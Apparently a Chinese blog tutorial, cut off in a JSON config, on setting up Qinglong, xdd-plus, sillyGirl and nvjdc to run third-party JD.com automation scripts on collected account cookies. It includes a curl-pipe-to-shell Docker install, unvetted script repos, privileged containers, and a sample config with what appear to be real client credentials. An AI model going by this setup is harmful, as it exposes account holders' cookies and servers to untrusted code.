    <content type="html"><![CDATA[<p>懒癌必备，京东代挂 <a href="https://jd.jhcda.top/" target="_blank" rel="noopener">直接上车链接</a></p><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><h3 id="购买服务器"><a href="#购买服务器" class="headerlink" title="购买服务器"></a>购买服务器</h3><p>腾讯云：<a href="https://curl.qcloud.com/OoHPvVZT" target="_blank" rel="noopener">2核4G8M带宽云服务器只需70元/年，198元/3年</a></p><p>阿里云：<a href="https://promotion.aliyun.com/ntms/yunparter/invite.html?userCode=cduz1yvw" target="_blank" rel="noopener">阿里云限时优惠1H2G1M 174元/3年</a></p><p>目前阿里云是限制越来越多，腾讯云是越来越便宜活动还多，<strong>强力推荐腾讯云</strong>！</p><p>腾讯云不是新用户的可以看本站教程无限新用户：<a href="https://www.iyouhun.com/post-190.html" target="_blank" rel="noopener">https://www.iyouhun.com/post-190.html</a></p><p>系统选择 <code>CentOS</code>或者<code>Ubuntu</code> 都行，我这里选择的 <code>CentOS 7.6</code>毕竟 8.0 官方已经不再维护了。</p><h3 id="开放端口"><a href="#开放端口" class="headerlink" title="开放端口"></a>开放端口</h3><p>去服务器防火墙开放以下端口</p><ul><li>5700 青龙面板</li><li>8080 XDD-Plus/傻妞</li><li>5701 nvjdc</li></ul><p>上述端口你也可以自定义，但是后续使用则必须使用你指定的端口！</p><p><img src="https://oss.iyouhun.com/img/QQ20211117-103129@2x.png!yhblog" alt=""></p><h2 id="开始搭建"><a href="#开始搭建" class="headerlink" title="开始搭建"></a>开始搭建</h2><h3 id="安装docke并设置开机启动"><a href="#安装docke并设置开机启动" class="headerlink" title="安装docke并设置开机启动"></a>安装docke并设置开机启动</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo yum check-update</span><br><span class="line">curl -sSL https://get.daocloud.io/docker | sh</span><br><span class="line">sudo systemctl start docker</span><br><span class="line">sudo systemctl status docker</span><br><span class="line">sudo systemctl enable docker</span><br></pre></td></tr></table></figure><p><img src="https://oss.iyouhun.com/img/QQ20211117-112454@2x.png!yhblog" alt=""></p><h3 id="安装青龙面板"><a href="#安装青龙面板" class="headerlink" title="安装青龙面板"></a>安装青龙面板</h3><h4 id="拉取青龙面板"><a href="#拉取青龙面板" class="headerlink" title="拉取青龙面板"></a>拉取青龙面板</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">docker run -dit \</span><br><span class="line">  --name ql \</span><br><span class="line">  --hostname ql \</span><br><span class="line">  --restart always \</span><br><span class="line">  -p 5700:5700 \</span><br><span class="line">  -v $PWD/ql/config:/ql/config \</span><br><span class="line">  -v $PWD/ql/log:/ql/log \</span><br><span class="line">  -v $PWD/ql/db:/ql/db \</span><br><span class="line">  -v $PWD/ql/scripts:/ql/scripts \</span><br><span class="line">  -v $PWD/ql/jbot:/ql/jbot \</span><br><span class="line">  whyour/qinglong:latest</span><br></pre></td></tr></table></figure><p> 端口号可自定义</p><p>-p 5700:5700 端口号为5700</p><p>-p xxxx:5700 端口号为xxxx</p><p>注：改的端口号一定要在安全组中放行该端口，不然访问不到</p><h4 id="登录青龙面板"><a href="#登录青龙面板" class="headerlink" title="登录青龙面板"></a>登录青龙面板</h4><p>在浏览器中输入 <code>服务器ip:端口号</code>    端口号为上一步你自己设置的端口号</p><p>例如：123.123.123.123:5700</p><p><strong>1.进入青龙面板的登陆页面，开始安装</strong></p><p><img src="https://oss.iyouhun.com/img/QQ20211117-112643@2x.png!yhblog" alt=""></p><p><strong>2.选择通知方式 这里的通知方式是青龙面板登录通知等，不会或者没有就跳过</strong></p><p><img src="https://oss.iyouhun.com/img/QQ20211117-112709@2x.png!yhblog" alt=""></p><p><strong>3.设置登录账号密码</strong></p><p><img src="https://oss.iyouhun.com/img/QQ20211117-112720@2x.png!yhblog" alt=""></p><p><strong>4.安装完成，去登录</strong></p><p><img src="https://oss.iyouhun.com/img/QQ20211117-112854@2x.png!yhblog" alt=""></p><h4 id="拉取定时任务脚本仓库"><a href="#拉取定时任务脚本仓库" class="headerlink" title="拉取定时任务脚本仓库"></a>拉取定时任务脚本仓库</h4><p>这里推荐两个仓库</p><p>faker2仓库：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ql repo https://ghproxy.com/https://github.com/shufflewzc/faker2.git "jd_|jx_|gua_|jddj_|getJDCookie" "activity|backUp" "^jd[^_]|USER|ZooFaker_Necklace.js|JDJRValidator_Pure|sign_graphics_validate"</span><br></pre></td></tr></table></figure><p>smiek2221仓库：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ql repo https://ghproxy.com/github.com/smiek2221/scripts.git "jd_|gua_" "" "ZooFaker_Necklace.js|JDJRValidator_Pure.js|sign_graphics_validate.js"</span><br></pre></td></tr></table></figure><p><strong>1.在定时任务里 添加任务</strong></p><p><img src="https://oss.iyouhun.com/img/QQ20211117-113613@2x.png!yhblog" alt=""></p><p><strong>2.添加完成后在列表里点击操作的运行先运行一次</strong></p><p><img src="https://oss.iyouhun.com/img/QQ20211117-114204@2x.png!yhblog" alt=""></p><h4 id="青龙依赖安装"><a href="#青龙依赖安装" class="headerlink" title="青龙依赖安装"></a>青龙依赖安装</h4><p>更新后的青龙安装依赖更方便了，直接输入依赖名称在线安装</p><p><img src="https://oss.iyouhun.com/img/QQ20211117-114432@2x.png!yhblog" alt=""></p><p>旧版的青龙需要使用命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it QL bash -c "npm install -g typescript"</span><br><span class="line">docker exec -it QL bash -c "npm install axios date-fns"</span><br><span class="line">docker exec -it QL bash -c "npm install crypto -g"</span><br><span class="line">docker exec -it QL bash -c "npm install jsdom"</span><br><span class="line">docker exec -it QL bash -c "npm install png-js"</span><br><span class="line">docker exec -it QL bash -c "npm install -g npm"</span><br><span class="line">docker exec -it QL bash -c "pnpm i png-js"</span><br><span class="line">docker exec -it QL bash -c "pip3 install requests"</span><br><span class="line">docker exec -it QL bash -c "apk add --no-cache build-base g++ cairo-dev pango-dev giflib-dev &amp;&amp; cd scripts &amp;&amp; npm install canvas --build-from-source"</span><br><span class="line">docker exec -it QL bash -c "apk add python3 zlib-dev gcc jpeg-dev python3-dev musl-dev freetype-dev"</span><br><span class="line">docker exec -it QL bash -c "cd /ql/scripts/ &amp;&amp; apk add --no-cache build-base g++ cairo-dev pango-dev giflib-dev &amp;&amp; npm i &amp;&amp; npm i -S ts-node typescript @types/node date-fns axios png-js canvas --build-from-source"</span><br></pre></td></tr></table></figure><p>依赖最好都安装上，防止很多脚本跑不了。</p><h4 id="应用设置配置"><a href="#应用设置配置" class="headerlink" title="应用设置配置"></a>应用设置配置</h4><p>这里的应用其实就是为了对接xdd-plus、nvjdc 等应用。</p><p><strong>1.添加应用，输入名称，勾选权限</strong></p><p><img src="https://oss.iyouhun.com/img/QQ20211117-130347@2x.png!yhblog" alt=""></p><p><strong>2.添加成功后，可以在列表中查看<code>Client ID</code>和<code>Client Secret</code>后面会用到</strong></p><p><img src="https://oss.iyouhun.com/img/QQ20211117-130505@2x.png!yhblog" alt=""></p><h3 id="搭建所需GO环境"><a href="#搭建所需GO环境" class="headerlink" title="搭建所需GO环境"></a>搭建所需GO环境</h3><blockquote><p>xdd-plus 和 傻妞都需要 Go 环境</p></blockquote><p><strong>1.安装gcc</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum -y install gcc</span><br><span class="line">yum -y install gcc-c++</span><br></pre></td></tr></table></figure><p><strong>2.下载go安装包 ，这里我们安装到<code>usr/local</code>目录</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/local &amp;&amp; wget https://golang.google.cn/dl/go1.16.7.linux-amd64.tar.gz -O go1.16.7.linux-amd64.tar.gz</span><br></pre></td></tr></table></figure><p><strong>3.解压go安装包</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -xvzf go1.16.7.linux-amd64.tar.gz</span><br></pre></td></tr></table></figure><p><strong>4.配置环境变量,路径<code>/etc/profile</code></strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">export GO111MODULE=on</span><br><span class="line">export GOPROXY=https://goproxy.cn</span><br><span class="line">export GOROOT=/usr/local/go</span><br><span class="line">export GOPATH=/usr/local/go/path</span><br><span class="line">export PATH=$PATH:$GOROOT/bin:$GOPATH/bin</span><br></pre></td></tr></table></figure><p>复制上方代码添加到<code>profile</code>文件末尾</p><p><img src="https://oss.iyouhun.com/img/QQ20211117-131402@2x.png!yhblog" alt=""></p><p><strong>5.刷新环境变量</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source /etc/profile</span><br></pre></td></tr></table></figure><p><strong>6.检测一下看看有没有安装成功</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go env</span><br></pre></td></tr></table></figure><p>如下图表示安装成功</p><p><img src="https://oss.iyouhun.com/img/QQ20211117-131649@2x.png!yhblog" alt=""></p><h3 id="安装xdd-plus"><a href="#安装xdd-plus" class="headerlink" title="安装xdd-plus"></a>安装xdd-plus</h3><p><strong>1.拉取xdd-plus的库</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd ~ &amp;&amp; git clone https://ghproxy.com/https://github.com/764763903a/xdd-plus.git</span><br></pre></td></tr></table></figure><p><strong>2.编译xdd</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd xdd-plus</span><br><span class="line">go build</span><br></pre></td></tr></table></figure><p><strong>3.给与xdd最高权限</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 xdd</span><br></pre></td></tr></table></figure><p><strong>4.运行xdd（要确保你在xdd-plus目录下）</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./xdd</span><br></pre></td></tr></table></figure><p>等程序跑个半分钟Ctrl+c退出</p><p><strong>5.修改root/xdd-plus/conf/config.yaml文件</strong></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">mode:</span> <span class="string">parallel</span>  <span class="comment">#模式 balance(均衡模式)、parallel(平行模式)</span></span><br><span class="line"><span class="attr">containers:</span></span><br><span class="line"><span class="attr">  - address:</span> <span class="attr">http://123.123.123.123:5700</span> <span class="comment">#这里是你青龙面板的地址</span></span><br><span class="line"><span class="attr">    username:</span> <span class="string">青龙面板的账号</span> <span class="comment">#登陆青龙面板的账号</span></span><br><span class="line"><span class="attr">    password:</span> <span class="string">青龙面板的密码</span> <span class="comment">#登录青龙面板的密码</span></span><br><span class="line"><span class="attr">    cid:</span> <span class="string">Client</span> <span class="string">ID</span> <span class="comment">#刚刚在青龙面板获取到的Client ID</span></span><br><span class="line"><span class="attr">    secret:</span> <span class="string">Client</span> <span class="string">Secret</span> <span class="comment">#刚刚在青龙面板获取到的Client Secret</span></span><br><span class="line"><span class="attr">    weigth:</span> <span class="number">1</span> <span class="comment">#权重 balance模式下权重越高分得的ck越多，默认1</span></span><br><span class="line"><span class="attr">    mode:</span> <span class="string">parallel</span> <span class="comment">#模式 balance(均衡模式)、parallel(平行模式)</span></span><br><span class="line"><span class="attr">    limit:</span> <span class="number">9999</span> <span class="comment">#限制容器ck数目</span></span><br><span class="line"><span class="attr">AtTime:</span> <span class="number">8</span> <span class="comment">#填写1-12之间的数  填错自负默认为10  10点容易出现高峰超时。</span></span><br><span class="line"><span class="attr">IsHelp:</span> <span class="literal">true</span>  <span class="comment">#填写true或者false  false</span></span><br><span class="line"><span class="attr">IsOldV4:</span> <span class="comment">#填写true或者false  false是否新版或者旧版V4</span></span><br><span class="line"><span class="attr">Wskey:</span> <span class="literal">true</span> <span class="comment"># 填空默认禁用wskey转换 需要的填true</span></span><br><span class="line"><span class="attr">IsAddFriend:</span> <span class="comment">#填写true或者false  false</span></span><br><span class="line"><span class="attr">Lim:</span> <span class="comment">#填写1-N 代表限制次数</span></span><br><span class="line"><span class="attr">Tyt:</span> <span class="comment">#填写1-N 代表推一推需要的互助值，默认为8</span></span><br><span class="line"><span class="attr">Later:</span> <span class="comment">#延时防止黑IP自己设置 默认60 不怕黑的改为1即可 单位是秒</span></span><br><span class="line"><span class="attr">ApiToken:</span> <span class="comment">#nvjdc短信接入token参数，自己设置</span></span><br><span class="line"><span class="attr">theme:</span> <span class="string">/root/xdd-plus/theme/admin.html</span>  <span class="comment">#自定义主题，支持本地、网络路径 </span></span><br><span class="line"><span class="attr">static:</span> <span class="string">./static</span> <span class="comment">#静态文件 便于自定义二维码页面时，引入css、js等文件</span></span><br><span class="line"><span class="attr">master:</span> <span class="comment">#xdd-plus后台密码，并从井号开始把这一段文字全部删除</span></span><br><span class="line"><span class="attr">database:</span> <span class="string">/root/xdd-plus/.xdd.db</span> </span><br><span class="line"><span class="attr">qywx_key:</span> <span class="comment">#企业微信推送key</span></span><br><span class="line"><span class="attr">daily_push:</span> <span class="comment">#定时任务</span></span><br><span class="line"><span class="attr">resident:</span> <span class="comment">#均衡模式下所有容器共同的账号pin，有多个用'&amp;'拼接。不建议填写。</span></span><br><span class="line"><span class="attr">user_agent:</span></span><br><span class="line"><span class="attr">telegram_bot_token:</span></span><br><span class="line"><span class="attr">telegram_user_id:</span></span><br><span class="line"><span class="attr">TGURL:</span> <span class="comment">#填写TG代理地址参考https://www.kejiwanjia.com/server/5221.html#3worker</span></span><br><span class="line"><span class="attr">qquid:</span> <span class="string">管理员QQ</span> <span class="comment">#接收通知的qq号，管理员QQ号码</span></span><br><span class="line"><span class="attr">qqgid:</span> <span class="string">QQ群号</span> <span class="comment">#监听的群</span></span><br><span class="line"><span class="attr">qbot_public_mode:</span> <span class="literal">true</span> <span class="comment">#qq机器人群聊模式，默认私聊模式</span></span><br><span class="line"><span class="attr">default_priority:</span> <span class="comment">#新用户默认优先级</span></span><br><span class="line"><span class="attr">no_ghproxy:</span> <span class="literal">true</span> <span class="comment">#更新资源是否不使用代理</span></span><br><span class="line"><span class="attr">daily_asset_push_cron:</span> <span class="number">0</span> <span class="number">21</span> <span class="string">*</span> <span class="string">*</span> <span class="string">*</span> <span class="comment">#日常资产推送时间 可以不填</span></span><br><span class="line"><span class="attr">repos:</span></span><br><span class="line"><span class="attr">  - git:</span> <span class="attr">https://github.com/shufflewzc/faker2.git</span></span><br></pre></td></tr></table></figure><p>修改完之后Ctrl+s保存文件退出，回到命令行在次运行上一步4</p><p>出现二维码，扫码绑定你的机器人qq，等一会后向你的机器人发消息测试。</p><p>！！！注意xdd-plus默认端口 8080</p><p><strong>6.然后<code>Ctrl+c</code>，为防止机器人被杀死我们后台挂机</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./xdd -d</span><br></pre></td></tr></table></figure><p>xdd-plus配置到此结束</p><h3 id="安装傻妞sillyGirl"><a href="#安装傻妞sillyGirl" class="headerlink" title="安装傻妞sillyGirl"></a>安装傻妞sillyGirl</h3><p><strong>1. 拉 “傻妞”库</strong> </p><p>由于傻妞现在默认路径在etc，所以教程内容也对应更新了路径</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /etc/ #cd到etc目录</span><br><span class="line">git clone https://ghproxy.com/https://github.com/cdle/sillyGirl.git #此时你的etc目录下会新增文件夹sillyGirl</span><br><span class="line">cd /etc/sillyGirl #cd到傻妞根目录</span><br></pre></td></tr></table></figure><p><strong>2. 新建dev.go</strong> </p><p>新建<code>dev.go</code>，用命令<code>touch dev.go</code>。或者直接用命令<code>vi dev.go</code>，键盘按字母i进入编辑。 输入下面的代码，按键盘Esc退出编辑，输入<code>:wq</code>保存并退出。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line">import (</span><br><span class="line">//青龙2.9机器人</span><br><span class="line">_ "github.com/cdle/sillyGirl/develop/qinglong" </span><br><span class="line">//京东账号</span><br><span class="line">_ "github.com/cdle/sillyGirl/develop/jd_cookie"</span><br><span class="line">//腾讯QQ</span><br><span class="line">_ "github.com/cdle/sillyGirl/im/qq"</span><br><span class="line">//Te Legram</span><br><span class="line">_ "github.com/cdle/sillyGirl/im/tg"</span><br><span class="line">//微信公众号</span><br><span class="line">_ "github.com/cdle/sillyGirl/im/wxmp"</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>不会的也可以直接将<code>dev.go.demo</code>重命名为<code>dev.go</code></p><p>除此之外，还需要拉取一些库。执行如下操作：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /etc/sillyGirl/develop ##cd到傻妞的扩展目录develop</span><br><span class="line">git clone https://ghproxy.com/https://github.com/ufuckee/jd_cookie.git ##拉扩展库</span><br></pre></td></tr></table></figure><p><strong>3. 新增配置文件并编译傻妞</strong> </p><p>新增sets.conf配置文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /etc/sillyGirl</span><br><span class="line">touch sets.conf</span><br></pre></td></tr></table></figure><p>配置内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"># 傻妞机器人名</span><br><span class="line">set sillyGirl name 傻妞</span><br><span class="line">#傻妞http服务是否开启，默认false，开启改为true</span><br><span class="line">set sillyGirl enable_http_server true</span><br><span class="line"># 傻妞http服务端口</span><br><span class="line">set sillyGirl port 8080</span><br><span class="line"># 傻妞消息撤回等待时间，单位秒</span><br><span class="line">set sillyGirl duration 5</span><br><span class="line"># 傻妞自动升级是否通知</span><br><span class="line">set sillyGirl update_notify false</span><br><span class="line"># 傻妞内置赞赏码</span><br><span class="line">set sillyGirl appreciate https://gitee.com/aiancandle/sillyGirl/raw/main/appreciate.jpg </span><br><span class="line"># 设置青龙openapi的client_id参数</span><br><span class="line">set qinglong client_id fy8UO_4jRraC</span><br><span class="line"># 设置青龙openapi的client_secret参数</span><br><span class="line">set qinglong client_secret sQqDqI5U1yS9-gyOUa1EAbXT</span><br><span class="line"># 青龙是否开启自动隐藏重复任务功能</span><br><span class="line">set qinglong autoCronHideDuplicate true</span><br><span class="line"># 设置青龙面板地址</span><br><span class="line">set qinglong host http://192.168.50.100:5700</span><br><span class="line"># 设置qq登录账号</span><br><span class="line">#set qq uin 10000 #这里建议注释，直接后台弹出二维码登陆</span><br><span class="line"># 设置qq登录密码</span><br><span class="line">#set qq password 123456789 #这里建议注释，直接后台弹出二维码登陆</span><br><span class="line"># 设置监听群聊号码，默认监听所有</span><br><span class="line">set qq groupCode ?</span><br><span class="line"># 设置是否自动同意好友请求</span><br><span class="line">set qq auto_friend false</span><br><span class="line"># 是否对自己发出的消息进行回复</span><br><span class="line">set qq onself true</span><br><span class="line"># 设置qq管理员</span><br><span class="line">set qq masters q1&amp;q2&amp;q3...</span><br><span class="line"># 设置接受通知的qq账号，默认管理员接受</span><br><span class="line">set qq notifier q1&amp;q2&amp;q3...</span><br><span class="line"># 设置qq设备信息(自动生成)</span><br><span class="line">#set qq device.json ?    #这里建议注释，直接后台弹出二维码登陆</span><br><span class="line"># 设置qq登录令牌(自动生成)</span><br><span class="line">#set qq session.token ?  #这里建议注释，直接后台弹出二维码登陆</span><br><span class="line"># 设置telegram机器人token</span><br><span class="line">set tg token ?</span><br><span class="line"># 设置telegram机器人代理</span><br><span class="line">set tg url ?</span><br><span class="line"># 设置telegram机器人管理员</span><br><span class="line">set tg masters t1&amp;t2&amp;t3...</span><br><span class="line"># 设置接受通知的telegram账号，默认管理员接受</span><br><span class="line">set tg notifier t1&amp;t2&amp;t3...</span><br><span class="line"># 设置微信公众平台app_id</span><br><span class="line">set wxmp app_id ?</span><br><span class="line"># 设置微信公众平台app_secret</span><br><span class="line">set wxmp app_secret ?</span><br><span class="line"># 设置微信公众平台token</span><br><span class="line">set wxmp token ?</span><br><span class="line"># 设置微信公众平台encoding_aes_key</span><br><span class="line">set wxmp encoding_aes_key ?</span><br><span class="line"># 设置微信公众平台管理员</span><br><span class="line">set wxmp masters w1&amp;w2&amp;w3...</span><br><span class="line"># 设置公众号关注事件回复</span><br><span class="line">set wxmp subscribe_reply 感谢关注！</span><br><span class="line"># 设置公众号默认回复</span><br><span class="line">set wxmp default_reply 无法回复该消息</span><br></pre></td></tr></table></figure><p><strong>4. 编译傻妞并运行</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /etc/sillyGirl &amp;&amp; go build</span><br><span class="line">chmod 777 sillyGirl</span><br><span class="line">./sillyGirl</span><br></pre></td></tr></table></figure><p><strong>5.等弹出二维码机器人QQ扫码绑定机器人</strong></p><p><img src="https://oss.iyouhun.com/img/WX20211117-174745@2x.png!yhblog" alt=""></p><p>等到QQ登录完，按住ctrl再按c退出</p><p><strong>6.设置后台静默运行</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup ./sillyGirl 1&gt;/dev/null 2&gt;&amp;1 &amp; #AMD64</span><br></pre></td></tr></table></figure><p>然后愉快的玩耍吧！</p><h3 id="安装nvjdc（Nolan）"><a href="#安装nvjdc（Nolan）" class="headerlink" title="安装nvjdc（Nolan）"></a>安装nvjdc（Nolan）</h3><p><strong>1.安装 wget、unzip并跳过询问是否安装</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install wget unzip -y</span><br></pre></td></tr></table></figure><p><strong>2.创建一个目录放配置以及chromium</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir nvjdc &amp;&amp; cd nvjdc</span><br></pre></td></tr></table></figure><p><strong>3.下载config.json 配置文件 并且修改自己的配置 不能缺少，链接失效，自己把群里的模版文件放上去。</strong></p><p><strong>国内国外请使用(推荐)</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://gitee.com/youhunwl/script/raw/master/Config.json</span><br></pre></td></tr></table></figure><p><strong>4.进入nvjdc，创建chromium文件夹并进入</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /root/nvjdc</span><br><span class="line">mkdir -p .local-chromium/Linux-884014 &amp;&amp; cd .local-chromium/Linux-884014 &amp;&amp; rm -f chrome-linux.zip</span><br></pre></td></tr></table></figure><p><strong>5.下载 chromium</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://mirrors.huaweicloud.com/chromium-browser-snapshots/Linux_x64/884014/chrome-linux.zip &amp;&amp; unzip chrome-linux.zip</span><br></pre></td></tr></table></figure><p><strong>6.删除刚刚下载的压缩包</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm -f chrome-linux.zip</span><br></pre></td></tr></table></figure><p><strong>7.回到刚刚创建的目录</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /root/nvjdc</span><br></pre></td></tr></table></figure><p><strong>8.拉镜像</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker pull nolanhzy/nvjdc:1.1</span><br></pre></td></tr></table></figure><p><strong>9.启动镜像</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --name nvjdc -p 5701:80 -d  -v  "$(pwd)"/Config.json:/app/Config/Config.json:ro \-v "$(pwd)"/.local-chromium:/app/.local-chromium  \-it --privileged=true  nolanhzy/nvjdc:1.1</span><br></pre></td></tr></table></figure><p>name：nvjdc 可以自定义，但是后续命令也要修改</p><p>这里的 5701 也是准备工作开放的端口，你也可以自定义</p><p><strong>10.编辑（重点）</strong></p><p><code>/root/nvjdc</code>目录下的<code>Config.json</code>文件，里面文档按自己使用情况修改</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  ///浏览器最多几个网页</span><br><span class="line">  "MaxTab": "4",</span><br><span class="line">  //网站标题</span><br><span class="line">  "Title": "游魂博客",</span><br><span class="line">  //回收时间分钟 不填默认3分钟</span><br><span class="line">  "Closetime": "5",</span><br><span class="line">  //网站公告</span><br><span class="line">  "Announcement": "为提高账户的安全性，请关闭京东免密支付。下载以下APP并登陆你的账号： 京东、京喜、京东金融、京东极速版。",</span><br><span class="line">  